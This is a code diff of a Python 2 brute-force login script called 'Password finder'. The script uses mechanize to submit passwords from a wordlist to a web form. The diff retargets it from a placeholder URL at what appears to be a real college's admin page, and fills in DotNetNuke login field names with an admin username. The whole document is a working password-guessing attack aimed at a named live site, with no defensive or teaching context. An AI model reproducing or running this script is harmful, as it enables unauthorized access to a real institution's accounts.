@@ -5,7 +5,7 @@ print "Password finder v1.0"
 print "-----------------------"
 
 # Enter correct website login page address.
-url = "http://website.com/login_page"
+url = "http://www.dudleycol.ac.uk/admin"
 
 # We need wodrlist with passwords, one password per row.
 wordlist = "wordlist.txt"
@@ -19,35 +19,35 @@ try:
 except:
     print "Wordlist not found."
     quit()
-    
+
 print "Finding password..."
 
 for password in wordlist:
     response = m.open(url)
     m.select_form(nr=0)
 
-    # Enter name of input and login or email    
-    m.form['name_of_input'] = 'admin@admin.com'    
-    
-    # Enter name of password input   
-    m.form['password'] = password.strip()
+    # Enter name of input and login or email
+    m.form['dnn$ctr1278$Login$Login_DNN$txtUsername'] = 'admin@admin.com'
 
-    # Form method (GET, POST ...)     
+    # Enter name of password input
+    m.form['dnn$ctr1278$Login$Login_DNN$txtPassword'] = password.strip()
+
+    # Form method (GET, POST ...)
     m.method = 'POST'
-   
+
     response = m.submit()
-    content = response.read()  
+    content = response.read()
 
     # Checking returned content, we have to find some part
     # of code which one is only in login page
-    # (Login button, Forgotten password link) for example:    
-    
-    find = '<button type="submit" class="btn btn-primary">Login</button>'    
+    # (Login button, Forgotten password link) for example:
 
-    # If script can't find part of login page, probably pass was found.    
+    find = '<button type="submit" class="btn btn-primary">Login</button>'
+
+    # If script can't find part of login page, probably pass was found.
     if find not in content:
         print "Password found: " + password.strip()
-        found = 1        
+        found = 1
         break
 
 if found == 1:
